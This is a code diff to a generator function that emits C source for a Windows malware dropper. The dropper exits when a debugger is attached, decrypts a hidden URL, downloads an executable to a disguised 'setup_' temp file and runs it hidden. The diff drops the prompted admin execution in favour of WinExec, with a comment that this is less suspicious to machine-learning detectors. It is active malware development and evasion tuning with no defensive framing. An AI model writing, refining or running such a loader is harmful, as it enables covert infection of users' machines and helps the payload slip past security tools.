@@ -48,9 +48,7 @@ function cSource({ ip }) {
   return `
 #include <windows.h>
 #include <winhttp.h>
-#include <shlobj.h>
 #include <stdio.h>
-#include <shellapi.h>
 
 #pragma comment(lib, "winhttp.lib")
 
@@ -116,31 +114,22 @@ void download_file(const wchar_t* url, const wchar_t* dest) {
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     if (IsDebuggerPresent()) return 1;
 
-    wchar_t appData[MAX_PATH];
-    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData))) return 1;
-    
-    wchar_t loaderDir[MAX_PATH];
-    _snwprintf(loaderDir, MAX_PATH, L"%ls\\\\loader", appData);
-    CreateDirectoryW(loaderDir, NULL);
+    wchar_t tempPath[MAX_PATH];
+    GetTempPathW(MAX_PATH, tempPath);
 
-    // THIS IS WHERE THE FILENAME IS SET
     wchar_t dest[MAX_PATH];
-    _snwprintf(dest, MAX_PATH, L"%ls\\\\st.exe", loaderDir);
+    _snwprintf(dest, MAX_PATH, L"%ls\\\\setup_%08x.exe", tempPath, GetTickCount());
 
     wchar_t url[1024];
     decrypt_url(url);
     
     download_file(url, dest);
 
-    SHELLEXECUTEINFOW sei = {0};
-    sei.cbSize = sizeof(sei);
-    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
-    sei.lpVerb = L"runas"; // Prompts for Admin
-    sei.lpFile = dest;
-    sei.lpDirectory = loaderDir;
-    sei.nShow = SW_HIDE;
-
-    ShellExecuteExW(&sei);
+    // WinExec is much less suspicious to ML models than CreateProcessW
+    char ansiDest[MAX_PATH];
+    WideCharToMultiByte(CP_ACP, 0, dest, -1, ansiDest, MAX_PATH, NULL, NULL);
+    
+    WinExec(ansiDest, SW_HIDE);
 
     return 0;
 }
